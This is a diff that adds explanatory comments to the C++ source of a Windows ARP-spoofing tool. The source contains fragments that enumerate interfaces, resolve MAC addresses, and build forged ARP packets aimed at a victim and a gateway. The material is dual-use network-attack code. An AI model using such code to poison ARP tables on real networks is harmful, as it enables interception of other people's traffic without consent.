@@ -1,23 +1,31 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "arpspoof.h"
-
+/*
+	encode the string	
+*/
 std::string Arpspoof::unicode_to_str(wchar_t *unistr) {
 	char buf[100];
 	int res = WideCharToMultiByte(CP_ACP, 0, unistr, wcslen(unistr), buf, 100, NULL, NULL);
 	return res > 0 ? std::string(buf, res) : std::string();
 }
-
+/*
+	encode ip to the string
+*/
 std::string Arpspoof::ip_to_str(const uint8_t ip[4]) {
 	return std::to_string(ip[0]) + "." + std::to_string(ip[1]) + "." + std::to_string(ip[2]) + "." + std::to_string(ip[3]);
 }
-
+/*
+		encode mac to the string
+*/
 std::string Arpspoof::mac_to_str(const uint8_t mac[6]) {
 	char s[18];
 	sprintf_s(s, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 	return std::string(s, 17);
 }
-
+/*
+	find ip interfaces
+*/
 std::vector<iface_info> Arpspoof::find_ifaces() {
 	int i = 0;
 	pcap_if_t *alldevs;
@@ -73,7 +81,9 @@ std::vector<iface_info> Arpspoof::find_ifaces() {
 	}
 	return ifaces;
 }
-
+/*
+print the interfaces
+*/
 void Arpspoof::print_ifaces(const std::vector<iface_info>& ifaces) {
 	int i = 1;
 	for (const iface_info& iface : ifaces) {
@@ -82,7 +92,9 @@ void Arpspoof::print_ifaces(const std::vector<iface_info>& ifaces) {
 		i++;
 	}
 }
-
+/*
+resolve the interfaces to the ip adresses
+*/
 bool Arpspoof::resolve(const iface_info& iface, const uint8_t ip[4], uint8_t mac[6]) {
 	SOCKADDR_INET srcif;
 	srcif.Ipv4.sin_family = AF_INET;
@@ -133,7 +145,9 @@ struct ArpHeader {
 	uint8_t target_mac[6];
 	uint8_t target_ip[4];
 };
-
+/*
+	fill out a arppacket including victim and gateway
+*/
 void Arpspoof::fill_arp_packet(uint8_t *packet, const uint8_t *victim_ip, const uint8_t *victim_mac, const uint8_t *my_ip, const uint8_t *my_mac) {
 	EthHeader *eth = (EthHeader *)packet;
 	ArpHeader *arp = (ArpHeader *)(packet + sizeof(EthHeader));
@@ -152,7 +166,9 @@ void Arpspoof::fill_arp_packet(uint8_t *packet, const uint8_t *victim_ip, const 
 	memcpy(arp->target_mac, victim_mac, 6);
 	memcpy(arp->target_ip, victim_ip, 4);
 }
-
+/*
+	finish the packets and send them on the datalink
+*/
 void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *data, const uint8_t *victim_mac, const uint8_t *victim_ip,
 	const uint8_t *target_mac, const uint8_t *my_mac) {
 	if (header->caplen != header->len || header->len > 65536) {
@@ -191,7 +207,10 @@ void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *d
 	}
 }
 
-
+/*
+the main function to spoof a victim
+ressolve his macadresds and spoof the arptable for also gateway and victim ip
+*/
 void Arpspoof::SendArpReplayForSpoofing(std::string victim)
 {
 	std::string target;
